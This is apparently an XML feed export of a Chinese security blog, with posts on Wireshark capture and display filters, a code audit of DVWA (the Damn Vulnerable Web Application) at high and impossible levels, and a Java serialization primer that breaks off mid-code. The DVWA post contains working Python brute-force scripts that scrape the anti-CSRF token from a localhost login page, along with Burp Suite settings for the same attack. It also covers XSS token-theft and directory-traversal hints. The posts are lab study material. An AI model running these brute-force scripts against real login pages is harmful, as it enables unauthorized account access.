</li><li>Information—有关数据包的信息。此字段可能会根据内部使用的协议类型而有所不同。例如，它将显示DNS数据包的查询类型。</li></ul></blockquote><p>数据包详细信息：蓝色 </p><blockquote><p>数据包详细信息窗口允许我们深入数据包，以更详细地检查协议。它将把它分解成我们所期望的块，遵循典型的OSI模型参考。将包分割成不同的封装层以进行检查。 请记住，Wireshark将以相反的顺序显示这种封装，在窗口顶部显示较低层的封装，在底部显示较高级别的封装。</p></blockquote><p>数据包字节数：绿色 </p><blockquote><p>“数据包字节”窗口允许我们查看ASCII或十六进制输出中的数据包内容。当我们从上面的窗口中选择一个字段时，它将在“数据包字节”窗口中突出显示，并向我们显示该位或字节在整个数据包中的位置。 这是验证我们在Details窗格中看到的内容是否准确以及Wireshark所做的解释是否与数据包输出匹配的好方法。 输出中的每一行都包含数据偏移量、十六个十六进制字节和十六个ASCII字节。不可打印的字节将替换为ASCII格式的句点。</p></blockquote><h3 id="fileter"><a href="#fileter" class="headerlink" title="fileter"></a>fileter</h3><table><thead><tr><th><strong>Capture Filters</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td>host x.x.x.x</td><td>Capture only traffic pertaining to a certain host</td></tr><tr><td>net x.x.x.x&#x2F;24</td><td>Capture traffic to or from a specific network (using slash notation to specify the mask)</td></tr><tr><td>src&#x2F;dst net x.x.x.x&#x2F;24</td><td>Using src or dst net will only capture traffic sourcing from the specified network or destined to the target network</td></tr><tr><td>port #</td><td>will filter out all traffic except the port you specify</td></tr><tr><td>not port #</td><td>will capture everything except the port specified</td></tr><tr><td>port # and #</td><td>AND will concatenate your specified ports</td></tr><tr><td>portrange x-x</td><td>portrange will grab traffic from all ports within the range only</td></tr><tr><td>ip &#x2F; ether &#x2F; tcp</td><td>These filters will only grab traffic from specified protocol headers.</td></tr><tr><td>broadcast &#x2F; multicast &#x2F; unicast</td><td>Grabs a specific type of traffic. one to one, one to many, or one to all.</td></tr></tbody></table><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231129095646892.png" alt="image-20231129095646892"></p><table><thead><tr><th><strong>Display Filters</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td>ip.addr &#x3D;&#x3D; x.x.x.x</td><td>Capture only traffic pertaining to a certain host. This is an OR statement.</td></tr><tr><td>ip.addr &#x3D;&#x3D; x.x.x.x&#x2F;24</td><td>Capture traffic pertaining to a specific network. This is an OR statement.</td></tr><tr><td>ip.src&#x2F;dst &#x3D;&#x3D; x.x.x.x</td><td>Capture traffic to or from a specific host</td></tr><tr><td>dns &#x2F; tcp &#x2F; ftp &#x2F; arp &#x2F; ip</td><td>filter traffic by a specific protocol. There are many more options.</td></tr><tr><td>tcp.port &#x3D;&#x3D; x</td><td>filter by a specific tcp port.</td></tr><tr><td>tcp.port &#x2F; udp.port !&#x3D; x</td><td>will capture everything except the port specified</td></tr><tr><td>and &#x2F; or &#x2F; not</td><td>AND will concatenate, OR will find either of two options, NOT will exclude your input option.</td></tr></tbody></table><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231129095938604.png" alt="image-20231129095938604"></p><blockquote><p>在使用捕获和显示过滤器时，请记住，我们指定的内容是从字面意义上获取的。例如，对端口80流量的过滤与对HTTP的过滤不同。将端口和协议想象成更像是指导方针，而不是严格的规则。端口可以绑定并用于不同的目的，而不是最初的目的。例如，HTTP过滤将查找协议使用的关键标记，如GET&#x2F;POST请求，并显示它们的结果。对端口80的过滤将显示通过该端口发送或接收的任何内容，而与传输协议无关。 在下一节中，我们将介绍Wireshark的一些更高级的功能。</p></blockquote><h2 id="从GUI提取文件"><a href="#从GUI提取文件" class="headerlink" title="从GUI提取文件"></a>从GUI提取文件</h2><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://academy.hackthebox.com/module/81/section/963&quot;&gt;Intro to Network Traffic Analysis (hackthebox.com)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;基础介绍&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://taninluv.github.io/tags/MISC/"/>
    
    <category term="NTA" scheme="https://taninluv.github.io/tags/NTA/"/>
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>DVWA</title>
    <link href="https://taninluv.github.io/2023/11/28/DVWA/"/>
    <id>https://taninluv.github.io/2023/11/28/DVWA/</id>
    <published>2023-11-28T01:41:29.000Z</published>
    <updated>2023-11-29T03:26:17.859Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都只尝试审计一下高难度，顺带练习一下代码审计工具,这里impassible难度是已经防御好的，high是高难度，我们主要关注这两个部分的源码</p><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>暴力破解，感觉没什么好审的，还是看看源码：</p><blockquote><?phpif( isset( $_POST[ 'Login' ] ) ) {  // Check Anti-CSRF token  checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );  // Sanitise username input  $user = $_POST[ 'username' ];  $user = stripslashes( $user );  $user = mysql_real_escape_string( $user );  // Sanitise password input  $pass = $_POST[ 'password' ];  $pass = stripslashes( $pass );  $pass = mysql_real_escape_string( $pass );  $pass = md5( $pass );  // Default values  $total_failed_login = 3;  $lockout_time    = 15;  $account_locked   = false;  // Check the database (Check user information)  $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR );  $data->execute();  $row = $data->fetch();  // Check to see if the user has been locked out.  if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {​    // User locked out.  Note, using this method would allow for user enumeration!​    //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";​    // Calculate when the user would be allowed to login again​    $last_login = $row[ 'last_login' ];​    $last_login = strtotime( $last_login );​    $timeout   = strtotime( "{$last_login} +{$lockout_time} minutes" );​    $timenow   = strtotime( "now" );​    // Check to see if enough time has passed, if it hasn't locked the account​    if( $timenow > $timeout )​      $account_locked = true;  }  // Check the database (if username matches the password)  $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR);  $data->bindParam( ':password', $pass, PDO::PARAM_STR );  $data->execute();  $row = $data->fetch();  // If its a valid login...  if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {​    // Get users details​    $avatar    = $row[ 'avatar' ];​    $failed_login = $row[ 'failed_login' ];​    $last_login  = $row[ 'last_login' ];​    // Login successful​    echo "<p>Welcome to the password protected area <em>{$user}</em></p>";​    echo "<img src=\"{$avatar}\" />";​    // Had the account been locked out since last login?​    if( $failed_login >= $total_failed_login ) {​      echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";​      echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";​    }​    // Reset bad login count​    $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );​    $data->bindParam( ':user', $user, PDO::PARAM_STR );​    $data->execute();  }  else {​    // Login failed​    sleep( rand( 2, 4 ) );​    // Give the user some feedback​    echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";​    // Update bad login count​    $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );​    $data->bindParam( ':user', $user, PDO::PARAM_STR );​    $data->execute();  }  // Set the last login time  $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR );  $data->execute();}// Generate Anti-CSRF tokengenerateSessionToken();?></blockquote><h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h2><p><a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数 (w3school.com.cn)</a></p><blockquote><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p></blockquote><h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a>stripslashes</h2><p><a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp">PHP stripslashes() 函数 (w3school.com.cn)</a></p><p>删除反斜杠</p><h2 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h2><p><a href="https://www.runoob.com/php/php-pdo.html">PHP PDO | 菜鸟教程 (runoob.com)</a></p><p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据</p><h2 id="fetch"><a href="#fetch" class="headerlink" title="fetch()"></a>fetch()</h2><p><a href="https://blog.csdn.net/weixin_43742708/article/details/106027375">PHP预处理语句- fetch方法、fetchAll方法、fetchColumn方法、fetch_style属性_fetch php-CSDN博客</a></p><h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><blockquote><p>在这个例子中，<code>(:user)</code> 将被数据库的预处理机制所识别。它表示一个占位符，表示在执行该预处理语句时，会将真正的值绑定到该占位符位置。</p><p>预处理语句中的占位符通常使用问号 <code>?</code> 或命名占位符，例如 <code>:user</code>。这些占位符允许程序在执行 SQL 语句之前，将实际的值绑定到占位符位置，避免了直接在 SQL 查询中嵌入变量值，从而提高了安全性和效率。</p><p>在这个例子中，<code>(:user)</code> 可能代表一个命名占位符，表示在执行预处理语句时，将会把真正的用户名绑定到这个占位符位置。在实际执行查询之前，程序会通过绑定操作将实际的值填充到占位符中。</p></blockquote><h2 id="简单审计"><a href="#简单审计" class="headerlink" title="简单审计"></a>简单审计</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126585.png" alt="image-20231128142725575"></p><p>这里先对token进行检测，防止csrf攻击，这里我们抓一个包看看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126586.png" alt="image-20231128143308585"></p><p>他应该是把session和user token有一个绑定以防止csrf</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126587.png" alt="image-20231128144047550"></p><p>这里添加了PDO防护，sql注入应该用不了</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126588.png" alt="image-20231128144446252"></p><p>这里如果登录失败三次会被锁住15分钟</p><p>其他的话就是登陆成功和不成功，sql加了pdo，注不了，只能慢慢爆破</p><h3 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h3><p>这里爆破的话：</p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/108755709">DVWA通过教程之暴力破解Brute Force_op&#x3D;login&amp;username&#x3D;admin%7cpwd&amp;password&#x3D; 攻击-CSDN博客</a></p><p>可以跟着做一遍，对bp的爆破模式使用加深一下</p><blockquote><p><strong>由于使用了Anti-CSRF token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，不建议利用burpsuite进行无脑式的爆破了。</strong></p></blockquote><p><em><strong>*Python2.x代码*</strong></em></p><pre><code class="python">from bs4 import BeautifulSoupimport urllib2header=&#123;&#39;Host&#39;:&#39;127.0.0.1&#39;,        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;,        &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,        &#39;Referer&#39;:&#39;http://127.0.0.1/vulnerabilities/brute/&#39;,        &#39;cookie&#39;:&#39;PHPSESSID=6oqhn9tsrs80rbf3h4cvjutnn6; security=high&#39;,        &#39;Connection&#39;:&#39;close&#39;,        &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;        &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header):    req=urllib2.Request(url=requrl,headers=header)    response=urllib2.urlopen(req)    print response.getcode(),    the_page=response.read()    print len(the_page)    soup=BeautifulSoup(the_page,&quot;html.parser&quot;)   #将返回的html页面解析为一个BeautifulSoup对象    input=soup.form.select(&quot;input[type=&#39;hidden&#39;]&quot;)   #返回的是一个list列表    user_token=input[0][&#39;value&#39;]               #获取用户的token    return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\Password\mima.txt&quot;):    requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token    i=i+1    print i , &#39;admin&#39; ,line.strip(),    user_token=get_token(requrl,header)    if(i==20):        break</code></pre><p><em><strong>*python3.x代码*</strong></em> </p><pre><code class="python">from bs4 import BeautifulSoupimport requests header=&#123;&#39;Host&#39;:&#39;127.0.0.1&#39;,        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;,        &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,        &#39;Referer&#39;:&#39;http://127.0.0.1/vulnerabilities/brute/&#39;,        &#39;cookie&#39;:&#39;PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high&#39;,        &#39;Connection&#39;:&#39;close&#39;,        &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;        &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header):    response=requests.get(url=requrl,headers=header)    print (response.status_code,len(response.content))    soup=BeautifulSoup(response.text,&quot;html.parser&quot;)    input=soup.form.select(&quot;input[type=&#39;hidden&#39;]&quot;)   #返回的是一个list列表    user_token=input[0][&#39;value&#39;]                   #获取用户的token    return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\Password\mima.txt&quot;):    requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token    i=i+1    print (i , &#39;admin&#39; ,line.strip(),end=&quot;  &quot;)    user_token=get_token(requrl,header)    if(i==20):        break</code></pre><p>bp:</p><p><strong>设置两个参数 password和user_token为变量，攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload，举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。</strong></p><p><strong>设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always</strong></p><p> <strong>写上value&#x3D;’ 点击刷新相应信息  服务器返回的token选中（即value后面，表示每次从响应中获取该值）</strong></p><p><strong>将这个token 值先记录下来</strong></p><p><strong>a5f168e741600adb87c761ac45d016dd</strong></p><p><strong>然后设置payload，设置第一个参数载入字典，第二个参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。</strong></p><h4 id="坑："><a href="#坑：" class="headerlink" title="坑："></a>坑：</h4><blockquote><p>在设置好Grep-Extract后，需要重新抓一个包把最新的user token作为初始参数 ，不然Recursive_Grep的参数会抓不到</p></blockquote><h1 id="Command-Inject"><a href="#Command-Inject" class="headerlink" title="Command Inject"></a>Command Inject</h1><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        &#125;        else &#123;            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        &#125;        // Feedback for the end user        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Ops. Let the user name theres a mistake        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><h2 id="explode"><a href="#explode" class="headerlink" title="explode()"></a>explode()</h2><p><a href="https://www.w3school.com.cn/php/func_string_explode.asp">PHP explode() 函数 (w3school.com.cn)</a></p><p>把字符串打散为数组：</p><pre><code>&lt;?php$str = &quot;Hello world. I love Shanghai!&quot;;print_r (explode(&quot; &quot;,$str));?&gt;</code></pre><h2 id="PHP-stristr-函数"><a href="#PHP-stristr-函数" class="headerlink" title="PHP stristr() 函数"></a>PHP stristr() 函数</h2><p>stristr() 函数搜索字符串在另一字符串中的第一次出现。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 <a href="https://www.w3school.com.cn/php/func_string_strstr.asp">strstr()</a> 函数。</p><p><a href="https://www.w3school.com.cn/php/func_string_stristr.asp">PHP stristr() 函数 (w3school.com.cn)</a></p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><pre><code>stristr(string,search,before_search)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>search</em></td><td align="left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td align="left"><em>before_search</em></td><td align="left">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><h2 id="php-uname"><a href="#php-uname" class="headerlink" title="php_uname"></a>php_uname</h2><p><a href="https://www.php.net/manual/zh/function.php-uname.php">PHP: php_uname - Manual</a></p><p>php_uname(string <code>$mode</code> &#x3D; “a”): string</p><pre><code>mode</code></pre><p><code>mode</code> 是单个字符，用于定义要返回什么信息：</p><ul><li><code>&#39;a&#39;</code>：此为默认。包含序列 <code>&quot;s n r v m&quot;</code> 里的所有模式。</li><li><code>&#39;s&#39;</code>：操作系统名称。例如： <code>FreeBSD</code>。</li><li><code>&#39;n&#39;</code>：主机名。例如： <code>localhost.example.com</code>。</li><li><code>&#39;r&#39;</code>：版本名称，例如： <code>5.1.2-RELEASE</code>。</li><li><code>&#39;v&#39;</code>：版本信息。操作系统之间有很大的不同。</li><li><code>&#39;m&#39;</code>：机器类型。例如：<code>i386</code>。</li></ul><h2 id="简单审计-1"><a href="#简单审计-1" class="headerlink" title="简单审计"></a>简单审计</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126589.png" alt="image-20231128153521652"></p><p>这里先对输入的ip进行分段检测然后再拼贴</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126590.png" alt="image-20231128154222514"></p><p>使用加工后的ip执行ping，这里ip必须为数字并且长度只能为4段，限制得很死</p><h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h3><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126591.png" alt="image-20231128155233024"></p><p>这里进行了一个黑名单过滤，但是黑名单有了一些意义不明的空格~</p><p>其实能用的方法基本上都被过滤了，剩下的可能是一些异或等方法了</p><p><a href="https://blog.csdn.net/qq_61778128/article/details/127063407">无数字字母rce总结（取反、异或、自增、临时文件）_MUNG东隅的博客-CSDN博客</a></p><p>好像还是不行hh~</p><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>csrf主要是前端的问题，简单审计一下</p><h2 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126592.png" alt="image-20231128160129804"></p><p>这里注入点被md5编码了，那么应该也无法使用报错注入。。</p><p>回到漏洞本身，我们通常使用的csrf检测手段是删除referer，如果请求依然成功判定为存在csrf漏洞，csrf token的防御是在每个会话上加一个token确保会话和用户身份的绑定，我们再看一眼中等难度，他没有使用csrf token，所以我们随便制作一个链接就可以进行csrf攻击，而这里可能需要借助一些xss来获取其他用户的token</p><p>这里补充一下：frames[0].document.getElementsByName(‘user_token’)使读取cookie的xsspayload</p><blockquote><p>frames[0].document.getElementsByName(‘user_token’)<br>在前端开发中，<code>frames</code> 是一个 JavaScript 对象，表示当前窗口或文档中包含的所有 <code>&lt;frame&gt;</code> 或 <code>&lt;iframe&gt;</code> 元素的集合。它提供了对嵌套框架（即内嵌页面）的访问和控制。</p><p>在这种情况下，<code>frames[0]</code> 表示当前文档中第一个 frame 或 iframe 元素，<code>.document</code> 属性用于访问该 frame 或 iframe 的文档对象，<code>getElementsByName(&#39;user_token&#39;)</code> 则是在该文档中根据名称获取元素的方法。</p></blockquote><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126593.png" alt="image-20231128162032027"></p><h3 id="fnmatch"><a href="#fnmatch" class="headerlink" title="fnmatch()"></a>fnmatch()</h3><p><a href="https://www.w3school.com.cn/php/func_filesystem_fnmatch.asp">PHP fnmatch() 函数 (w3school.com.cn)</a></p><p>fnmatch() 函数根据指定的模式来匹配文件名或字符串。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><pre><code>fnmatch(pattern,string,flags)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>pattern</em></td><td align="left">必需。规定要检索的模式。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定要检查的字符串或文件。</td></tr><tr><td align="left"><em>flags</em></td><td align="left">可选。</td></tr></tbody></table><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>此函数对于文件名尤其有用，但也可以用于普通的字符串。普通用户可能习惯于 shell 模式或者至少其中最简单的形式 ‘?’ 和 ‘*’ 通配符，因此使用 fnmatch() 来代替 ereg() 或者 preg_match() 来进行前端搜索表达式输入对于非程序员用户更加方便。</p><p>这道题的话写个file就可以进行目录穿越了：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126594.png" alt="image-20231128193808682"></p><p>直接file协议读取也可以。</p><p>先写到这里，等考完之后再写</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;都只尝试审计一下高难度，顺带练习一下代码审计工具,这里impassible难度是已经防御好的，high是高难度，我们主要关注这两个部分的源码</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://taninluv.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化前瞻</title>
    <link href="https://taninluv.github.io/2023/11/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%9E%BB/"/>
    <id>https://taninluv.github.io/2023/11/27/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E7%9E%BB/</id>
    <published>2023-11-27T02:06:38.000Z</published>
    <updated>2023-11-27T08:59:04.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>给java反序列化上个引子，顺带把webgoat代码审计结束了</p><p>本来要开始学链子了，但是网警和技侦要开始考试了，打算突击一下ctf和代码审计，下个月在正式学习java反序列化</p><p><a href="https://www.runoob.com/java/java-files-io.html">Java 流(Stream)、文件(File)和IO | 菜鸟教程 (runoob.com)</a></p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><blockquote><p>Java 序列化是一种将对象转换为字节流的过程，以便可以将对象保存到磁盘上，将其传输到网络上，或者将其存储在内存中，以后再进行反序列化，将字节流重新转换为对象。</p><p>序列化在 Java 中是通过 <strong>java.io.Serializable</strong> 接口来实现的，该接口没有任何方法，只是一个标记接口，用于标识类可以被序列化。</p><p>当你序列化对象时，你把它包装成一个特殊文件，可以保存、传输或存储。反序列化则是打开这个文件，读取序列化的数据，然后将其还原为对象，以便在程序中使用。</p><p>序列化是一种用于保存、传输和还原对象的方法，它使得对象可以在不同的计算机之间移动和共享，这对于分布式系统、数据存储和跨平台通信非常有用。</p></blockquote><h1 id="Java-流-Stream-、文件-File-和IO"><a href="#Java-流-Stream-、文件-File-和IO" class="headerlink" title="Java 流(Stream)、文件(File)和IO"></a>Java 流(Stream)、文件(File)和IO</h1><blockquote><p>Java.io 包几乎包含了所有操作输入、输出需要的类。所有这些流类代表了输入源和输出目标。</p><p>Java.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。</p><p>一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。</p><p>Java 为 I&#x2F;O 提供了强大的而灵活的支持，使其更广泛地应用到文件传输和网络编程中。</p></blockquote><p><img src="https://www.runoob.com/wp-content/uploads/2013/12/iostream2xx.png" alt="img"></p><h1 id="java-反射"><a href="#java-反射" class="headerlink" title="java 反射"></a>java 反射</h1><p><a href="https://www.w3cschool.cn/java/java-reflex.html">java反射机制深入理解剖析_w3cschool</a></p><blockquote><p>在java开发中有一个非常重要的概念就是java反射机制，也是java的重要特征之一。反射的概念是由Smith在1982年首次提出的，主要是指程序可以访问、检测和修改它本身状态或行为的一种能力，通过反射可以调用私有方法和私有属性，大部分框架也都是运用反射原理的。java通常是先有类再有对象，有对象就可以调用方法或者属性，java中的反射其实是通过Class对象来调用类里面的方法。掌握了反射的知识，才能更好的学习java高级课程。</p></blockquote><p>一个类有多个组成部分，例如:成员变量、方法、构造方法等，反射就是加载类,并解剖出类的各个组成部分。</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127110009212.png" alt="image-20231127110009212"></p><h1 id="序列化过程简单演示"><a href="#序列化过程简单演示" class="headerlink" title="序列化过程简单演示"></a>序列化过程简单演示</h1><p>先创建一个类Person.java</p><pre><code>package test;import java.io.Serializable;public class Person implements Serializable &#123;    private String username;    public int age;    public Person(String username, int age) &#123;        this.username = username;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;person&#123;&quot; +                &quot;username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, age=&quot; + age +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20231127151420206.png" alt="image-20231127151420206"></p><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p>序列化文件 SerializationTest.java</p><pre><code>package test;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;public class SerializationTest &#123;    public static void serialize(Object object) throws IOException&#123;        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));        objectOutputStream.writeObject(object);    &#125;    public static void main(String[] args) throws Exception&#123;        Person person = new Person(&quot;water3&quot;,23);        serialize(person);        System.out.println(&quot;serialize:&quot;+person);    &#125;&#125;</code></pre><p><strong>序列化对象：</strong> 使用 ObjectOutputStream 类来将对象序列化为字节流</p><p>这里新创建了一个FileOutputStream类来接受序列化对象，该类用来创建一个文件并向文件中写数据。</p><p>如果该流在打开文件进行输出前，目标文件不存在，那么该流会创建该文件。</p><p>有两个构造方法可以用来创建 FileOutputStream 对象。</p><p>使用字符串类型的文件名来创建一个输出流对象：</p><pre><code>OutputStream f = new FileOutputStream(&quot;C:/java/hello&quot;)</code></pre><p>也可以使用一个文件对象来创建一个输出流来写文件。我们首先得使用File()方法来创建一个文件对象：</p><pre><code>File f = new File(&quot;C:/java/hello&quot;); OutputStream fOut = new FileOutputStream(f);</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code>package test;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInput;import 